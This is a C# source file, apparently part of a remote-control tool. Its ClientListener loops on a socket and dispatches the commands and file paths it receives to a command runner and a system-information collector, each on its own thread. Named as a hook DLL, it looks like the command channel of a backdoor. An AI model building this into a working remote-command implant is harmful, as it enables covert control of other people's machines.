using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace HookHandlerDLL
{
    class ClientListener
    {
        Socket socket;
        bool isRun;
        CommandRunner commandRunner;
        SystemInformer systemInformer;
        public ClientListener(Socket socket)
        {
            this.socket = socket;
            isRun = true;
            commandRunner = new CommandRunner(socket);
            systemInformer = new SystemInformer(socket);
        }

        public void Run()
        {
            
            while (isRun)
            {
                try
                {
                    byte[] type = new byte[1];
                    socket.Receive(type);
                    byte[] data = ReceiveVarData(socket);

                    switch (type[0])
                    {
                        case 0:
                            string command = Encoding.UTF8.GetString(data);
                            new Thread(()=>commandRunner.Run(command)).Start();
                            break;
                        case 1:
                            string path = Encoding.UTF8.GetString(data);
                            new Thread(() => systemInformer.Run(path)).Start();
                            break;
                    }
                }
                catch 
                {
                    Stop();
                }
            }              
            
        }

        public void Stop()
        {
            isRun = false;
            socket.Close();
        }

        private byte[] ReceiveVarData(Socket client)
        {

            byte[] datasize = new byte[4];
            client.Receive(datasize, 0, 4, 0);
            int size = BitConverter.ToInt32(datasize, 0);

            int total = 0;
            int dataleft = size;
            byte[] data = new byte[size];


            while (total < size)
            {
                int recv = client.Receive(data, total, dataleft, 0);
                if (recv == 0)
                {
                    break;
                }
                total += recv;
                dataleft -= recv;
            }
            return data;
        }


    }
}
